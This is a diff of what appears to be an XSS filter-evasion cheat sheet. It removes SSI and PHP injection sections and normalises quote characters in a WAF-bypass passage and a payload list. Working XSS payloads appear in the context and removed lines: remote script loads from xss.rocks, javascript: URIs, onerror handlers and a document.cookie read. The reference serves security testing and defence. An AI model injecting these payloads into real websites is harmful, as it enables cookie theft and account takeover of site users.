@@ -701,23 +701,6 @@ This attack allows you to rename your JavaScript file to an image as an XSS vect
 <SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>
 ```
 
-### SSI (Server Side Includes)
-
-This requires SSI to be installed on the server to use this XSS vector. I probably don't need to mention this, but if you can run commands on the server there are no doubt much more serious issues:
-
-```js
-<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->
-```
-
-### PHP
-
-This attack requires PHP to be installed on the server. Again, if you can run any scripts remotely like this, there are probably much more dire issues:
-
-```php
-<? echo('<SCR)';
-echo('IPT>alert("XSS")</SCRIPT>'); ?>
-```
-
 ### IMG Embedded Commands
 
 This attack only works when this is injected (like a web-board) in a web page behind password protection and that password protection works with other commands on the same domain. This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc. This is one of the lesser used but more useful XSS vectors:
@@ -1014,7 +997,7 @@ Here are all the possible combinations of the character `\<` in HTML and JavaScr
 
 #### Stored XSS
 
-If an attacker managed to push XSS through the filter, WAF wouldn’t be able to prevent the attack conduction.
+If an attacker managed to push XSS through the filter, WAF wouldn't be able to prevent the attack conduction.
 
 #### Reflected XSS in JavaScript
 
@@ -1082,7 +1065,7 @@ This request will pass through the WAF and an XSS attack will be conducted in ce
 - `<Input value = "XSS" type = text>`
 - `<applet code="javascript:confirm(document.cookie);">`
 - `<isindex x="javascript:" onmouseover="alert(XSS)">`
-- `"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`
+- `"></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`
 - `"><img src="x:x" onerror="alert(XSS)">`
 - `"><iframe src="javascript:alert(XSS)">`
 - `<object data="javascript:alert(XSS)">`
